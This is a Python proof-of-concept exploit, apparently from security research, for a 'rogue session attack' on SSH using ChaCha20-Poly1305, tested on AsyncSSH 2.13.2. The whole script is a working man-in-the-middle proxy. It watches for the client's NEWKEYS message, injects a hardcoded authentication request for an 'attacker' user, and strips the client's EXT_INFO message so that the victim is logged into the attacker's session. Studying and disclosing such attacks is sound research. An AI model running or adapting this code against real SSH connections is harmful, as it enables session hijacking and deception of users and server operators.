#!/usr/bin/python3
from binascii import unhexlify
import socket
from threading import Thread
from time import sleep

import click

##################################################################################
## Proof of Concept for the rogue session attack (ChaCha20-Poly1305)            ##
##                                                                              ##
## Variant: Unmodified variant (EXT_INFO by client required)                    ##
##                                                                              ##
## Client(s) tested: AsyncSSH 2.13.2 (simple_client.py example)                 ##
## Server(s) tested: AsyncSSH 2.13.2 (simple_server.py example)                 ##
##                                                                              ##
## Licensed under Apache License 2.0 http://www.apache.org/licenses/LICENSE-2.0 ##
##################################################################################

@click.command()
@click.option("--proxy-ip", default="0.0.0.0", help="The interface address to bind the TCP proxy to.")
@click.option("--proxy-port", default=22, help="The port to bind the TCP proxy to.")
@click.option("--server-ip", help="The IP address where the AsyncSSH server is running.")
@click.option("--server-port", default=22, help="The port where the AsyncSSH server is running.")
def cli(proxy_ip, proxy_port, server_ip, server_port):
    print("--- Proof of Concept for the rogue session attack (ChaCha20-Poly1305) ---", flush=True)
    mitm_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    mitm_socket.bind((proxy_ip, proxy_port))
    mitm_socket.listen(5)

    print(f"[+] MitM Proxy started. Listening on {(proxy_ip, proxy_port)} for incoming connections...", flush=True)

    try:
        while True:
            client_socket, client_addr = mitm_socket.accept()
            print(f"[+] Accepted connection from: {client_addr}", flush=True)
            print(f"[+] Establishing new server connection to {(server_ip, server_port)}.", flush=True)
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.connect((server_ip, server_port))
            print("[+] Spawning new forwarding threads to handle client connection.", flush=True)
            Thread(target=forward_client_to_server, args=(client_socket, server_socket)).start()
            Thread(target=forward_server_to_client, args=(client_socket, server_socket)).start()
    except KeyboardInterrupt:
        client_socket.close()
        server_socket.close()
        mitm_socket.close()

# Length of the individual messages
NEW_KEYS_LENGTH = 16
CLIENT_EXT_INFO_LENGTH = 60
# Additional data sent by the client after NEW_KEYS (excluding EXT_INFO)
ADDITIONAL_CLIENT_DATA_LENGTH = 60

newkeys_payload = b'\x00\x00\x00\x0c\x0a\x15'
def contains_newkeys(data):
    return newkeys_payload in data

rogue_userauth_request = unhexlify('000000440b320000000861747461636b65720000000e7373682d636f6e6e656374696f6e0000000870617373776f7264000000000861747461636b65720000000000000000000000')
def insert_rogue_authentication_request(data):
    newkeys_index = data.index(newkeys_payload)
    # Insert rogue authentication request and remove SSH_MSG_EXT_INFO
    return data[:newkeys_index] + rogue_userauth_request + data[newkeys_index:newkeys_index + NEW_KEYS_LENGTH] + data[newkeys_index + NEW_KEYS_LENGTH + CLIENT_EXT_INFO_LENGTH:]

def forward_client_to_server(client_socket, server_socket):
    delay_next = False
    try:
        while True:
            client_data = client_socket.recv(4096)
            if delay_next:
                delay_next = False
                sleep(5)
            if contains_newkeys(client_data):
                print("[+] SSH_MSG_NEWKEYS sent by client identified!", flush=True)
                if len(client_data) < NEW_KEYS_LENGTH + CLIENT_EXT_INFO_LENGTH + ADDITIONAL_CLIENT_DATA_LENGTH:
                    print("[+] client_data does not contain all messages sent by the client yet. Receiving additional bytes until we have 156 bytes buffered!", flush=True)
                while len(client_data) < NEW_KEYS_LENGTH + CLIENT_EXT_INFO_LENGTH + ADDITIONAL_CLIENT_DATA_LENGTH:
                    client_data += client_socket.recv(4096)
                print(f"[d] Original client_data before modification: {client_data.hex()}", flush=True)
                client_data = insert_rogue_authentication_request(client_data)
                print(f"[d] Modified client_data with rogue authentication request: {client_data.hex()}", flush=True)
                delay_next = True
            if len(client_data) == 0:
                break
            server_socket.send(client_data)
    except ConnectionResetError:
        print("[!] Client connection has been reset. Continue closing sockets.", flush=True)
    print("[!] forward_client_to_server thread ran out of data, closing sockets!", flush=True)
    client_socket.close()
    server_socket.close()

def forward_server_to_client(client_socket, server_socket):
    try:
        while True:
            server_data = server_socket.recv(4096)
            if len(server_data) == 0:
                break
            client_socket.send(server_data)
    except ConnectionResetError:
        print("[!] Target connection has been reset. Continue closing sockets.", flush=True)
    print("[!] forward_server_to_client thread ran out of data, closing sockets!", flush=True)
    client_socket.close()
    server_socket.close()

if __name__ == '__main__':
    cli()
